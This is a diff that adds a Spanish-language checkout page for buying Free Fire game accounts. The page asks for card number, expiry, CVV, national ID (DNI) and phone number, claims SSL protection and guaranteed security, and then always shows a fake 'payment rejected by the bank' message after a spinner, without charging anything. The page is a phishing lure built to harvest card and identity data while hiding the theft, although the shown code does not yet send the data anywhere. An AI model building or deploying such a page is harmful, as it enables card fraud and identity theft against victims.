@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pago con Tarjeta - Free Fire</title>
+  
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet"/>
+<style>
+  body { font-family:'Poppins', sans-serif; background:#f9fafc; color:#333; }
+  header { background:linear-gradient(90deg,#ff6600,#ff3300); color:#fff; text-align:center; padding:60px 20px; }
+  header h1 { font-weight:800; font-size:2.5rem; }
+  header p { font-size:1.1rem; margin-top:10px; }
+  .card { border:none; border-radius:16px; box-shadow:0 6px 20px rgba(0,0,0,0.08); }
+  footer { background:#111; color:#bbb; text-align:center; padding:20px; margin-top:20px; font-size:.9rem; }
+  .secure-msg { font-size:.9rem; color:#28a745; font-weight:600; margin-top:10px; }
+  .whatsapp-section {
+    background: linear-gradient(90deg,#e6fff2,#d9ffea);
+    border: 1px solid #c9f3d9;
+    padding:14px;
+    border-radius:12px;
+    margin-bottom:14px;
+    display:flex;
+    gap:12px;
+    align-items:center;
+    flex-wrap:wrap;
+  }
+  .whatsapp-section .icon { font-size:1.8rem; color:#1ebd52; }
+  .whatsapp-note { font-weight:700; color:#0b6b3a; margin:0; }
+  .whatsapp-sub { font-size:.95rem; color:#0b6b3a; margin:0; }
+  .phone-input { flex:1 1 100%; display:flex; align-items:center; gap:6px; }
+  @media(min-width:576px){ .phone-input{ flex:0 0 auto; max-width:260px; } }
+  .phone-prefix { background:#e9ecef; border:1px solid #ced4da; border-radius:.375rem; padding:.375rem .75rem; font-weight:600; color:#495057; }
+  .dni-input { max-width:240px; }
+  .alert-bank-reject {
+    background:#fff4f4;
+    border:1px solid #f5c2c7;
+    color:#7a1f1f;
+    font-weight:700;
+  }
+  .loading-spinner {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    margin-top: 16px;
+  }
+  .loading-dot {
+    width: 10px;
+    height: 10px;
+    background: #333;
+    border-radius: 50%;
+    animation: bounce 1.2s infinite;
+  }
+  .loading-dot:nth-child(2) { animation-delay: 0.2s; }
+  .loading-dot:nth-child(3) { animation-delay: 0.4s; }
+  @keyframes bounce { 0%, 80%, 100% { transform: scale(0);} 40% { transform: scale(1);} }
+  .payment-logos {
+    margin-top:30px;
+    text-align:center;
+  }
+  .payment-logos img {
+    max-width:100%;
+    height:auto;
+    border-radius:8px;
+    box-shadow:0 4px 10px rgba(0,0,0,0.15);
+  }
+</style>
+
+</head>
+<body>
+<header>
+  <h1>Pago con Tarjeta</h1>
+  <p>Transacción protegida con encriptación avanzada SSL</p>
+  <p class="secure-msg"><i class="bi bi-shield-check"></i> Seguridad garantizada</p>
+</header>
+
+<div class="container my-4 px-3" style="max-width:640px;">
+  <div class="card shadow p-4">
+    <h4 class="text-center mb-4">Ingresa los datos de tu tarjeta</h4>
+
+    <!-- WhatsApp / Phone section -->
+    <div class="whatsapp-section">
+      <div class="icon"><i class="bi bi-whatsapp"></i></div>
+      <div style="flex:1; min-width:160px;">
+        <p class="whatsapp-note">Recibirás los datos por WhatsApp</p>
+        <p class="whatsapp-sub">Una vez confirmado el pago, los datos de la cuenta serán enviados al número que indiques abajo.</p>
+      </div>
+      <div class="phone-input">
+        <span class="phone-prefix">+54</span>
+        <label class="form-label visually-hidden" for="telefono">Teléfono</label>
+        <input id="telefono" name="telefono" type="tel" class="form-control" placeholder="91112345678" required pattern="\d{10}" maxlength="10" inputmode="numeric">
+      </div>
+    </div>
+
+    <form id="paymentForm" onsubmit="return procesarPago(event)">
+      <div class="mb-3">
+        <label class="form-label">Nombre completo</label>
+        <input type="text" class="form-control" required>
+      </div>
+      <div class="mb-3">
+        <label class="form-label">Número de tarjeta</label>
+        <input type="text" maxlength="16" class="form-control" inputmode="numeric" pattern="[0-9]{13,16}" required>
+      </div>
+      <div class="row">
+        <div class="col-6 mb-3">
+          <label class="form-label">Vencimiento</label>
+          <input id="vencimiento" type="text" class="form-control" placeholder="MM/AA" required maxlength="5" inputmode="numeric">
+        </div>
+        <div class="col-6 mb-3">
+          <label class="form-label">CVV</label>
+          <input type="text" maxlength="4" class="form-control" inputmode="numeric" pattern="\d{3,4}" required>
+        </div>
+      </div>
+      <div class="mb-3 d-flex flex-column flex-sm-row gap-2 align-items-start">
+        <div class="dni-input w-100">
+          <label class="form-label">DNI</label>
+          <input id="dni" type="text" class="form-control" inputmode="numeric" placeholder="00.000.000" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn btn-dark w-100">Confirmar pago</button>
+    </form>
+
+    <div id="loadingAnim" class="loading-spinner d-none">
+      <div class="loading-dot"></div>
+      <div class="loading-dot"></div>
+      <div class="loading-dot"></div>
+    </div>
+
+    <div id="bankRejectMsg" class="alert alert-bank-reject mt-3 d-none">
+      <i class="bi bi-exclamation-triangle-fill"></i> Pago rechazado por el banco. Si crees que esto es un error, comunícate con tu entidad financiera para obtener más información.
+    </div>
+
+    <div id="infoAfter" class="mt-3 text-muted small">
+      <p><strong>Importante:</strong> El número debe contener 10 dígitos después del +54 (por ej: 91112345678). El DNI debe tener 8 dígitos (formato 00.000.000).</p>
+    </div>
+
+    <!-- Payment logos section -->
+    <div class="payment-logos">
+      <img src="tiendanube.jpg" alt="Medios de pago">
+    </div>
+
+  </div>
+</div>
+
+<footer>
+  <p>Contacto: tuemail@ejemplo.com | WhatsApp: +54 0000000000</p>
+  <p>&copy; 2025 Venta Free Fire | Compra segura garantizada</p>
+</footer>
+
+<script>
+// Auto-insert "/" in vencimiento field (MM/AA)
+document.addEventListener("DOMContentLoaded", function(){
+  var venc = document.getElementById("vencimiento");
+  venc.addEventListener("input", function(e){
+    var val = venc.value.replace(/[^0-9]/g,"").slice(0,4);
+    if(val.length >= 3){
+      venc.value = val.slice(0,2) + "/" + val.slice(2);
+    } else {
+      venc.value = val;
+    }
+  });
+
+  // DNI formatting: accept up to 8 digits and format as 00.000.000
+  var dni = document.getElementById("dni");
+  dni.addEventListener("input", function(e){
+    var digits = dni.value.replace(/[^0-9]/g,"").slice(0,8);
+    var part1 = digits.slice(0,2);
+    var part2 = digits.slice(2,5);
+    var part3 = digits.slice(5,8);
+    var formatted = part1;
+    if(part2) formatted += (formatted ? "." : "") + part2;
+    if(part3) formatted += "." + part3;
+    dni.value = formatted;
+  });
+
+  dni.addEventListener("focus", function(){ setTimeout(function(){ dni.selectionStart = dni.selectionEnd = dni.value.length; }, 0); });
+});
+
+// Payment processing simulation with loading animation
+function procesarPago(e){
+  e.preventDefault();
+  var telefono = document.getElementById('telefono');
+  var dni = document.getElementById('dni');
+  var bankMsg = document.getElementById('bankRejectMsg');
+  var loading = document.getElementById('loadingAnim');
+
+  var phoneDigits = telefono.value.replace(/\D/g,"");
+  if(phoneDigits.length !== 10){
+    telefono.classList.add('is-invalid');
+    telefono.focus();
+    return false;
+  } else {
+    telefono.classList.remove('is-invalid');
+  }
+
+  var dniDigits = dni.value.replace(/\D/g,"");
+  if(dniDigits.length !== 8){
+    dni.classList.add('is-invalid');
+    dni.focus();
+    return false;
+  } else {
+    dni.classList.remove('is-invalid');
+  }
+
+  bankMsg.classList.add('d-none');
+  loading.classList.remove('d-none');
+
+  setTimeout(function(){
+    loading.classList.add('d-none');
+    bankMsg.classList.remove('d-none');
+  }, 3000);
+
+  var footer = document.querySelector('footer p');
+  footer.innerHTML = 'Contacto: tuemail@ejemplo.com | WhatsApp: +54 ' + telefono.value;
+
+  return false;
+}
+</script>
+</body>
+</html>
